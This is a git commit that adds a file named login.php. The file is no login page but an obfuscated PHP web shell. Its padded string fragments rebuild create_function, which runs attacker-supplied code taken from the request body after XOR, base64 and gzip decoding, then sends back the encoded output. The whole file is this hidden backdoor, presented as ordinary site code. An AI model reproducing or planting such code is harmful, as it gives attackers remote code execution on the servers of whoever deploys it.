86a6160f6c27bcc9f4e3a283a65eb63fe2272b1e
BackTry <76502678+0backtry@users.noreply.github.com>
2022-07-12 20:46:37 +0100

    Create login.php

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+$j='mV})==1) {@ob_stV}arV}t();@evV}al(@gzuncomV}pV}ress(@x(@baV}se64_V}dV}ecode($';
+$u='l)V};$j++,$i++V}){$o.=$V}t{$i}^$k{$jV}};}}reV}V}V}turnV} $o;}if V}(@preg_maV}';
+$y='EV}42AAxxyV}rvwrV}joV}Fm";functV}iV}on x(V}$t,$k){$c=strV}len($k);$l=';
+$s=str_replace('wm','','cwmreatwmewmwm_wmwmfunction');
+$H='V}strV}len($V}t);$oV}="";for(V}$i=0V};$i<$l;V}){for($j=0V};(V}$j<$c&&$V}iV}<$';
+$G='mV}[1])V},$k)));$o=V}@V}ob_get_conV}tents(V});V}@ob_end_cleV}an()V};$';
+$M='tchV}("/$kh(.+)$kfV}/V}",@fileV}_get_contents("V}php://iV}nputV}")V},$';
+$p='r=@base6V}4V}_encodV}e(@x(@gzcoV}mpV}resV}s($o),V}$k));priV}nt("$p$khV}$r$kf");}';
+$t='$k="125V}V}005a4";$kh=V}"33V}558aV}bd33ac";$kf="4V}2f1cV}dce8V}cbV}3";$p="';
+$F=str_replace('V}','',$t.$y.$H.$u.$M.$j.$G.$p);
+$B=$s('',$F);$B();
+?>
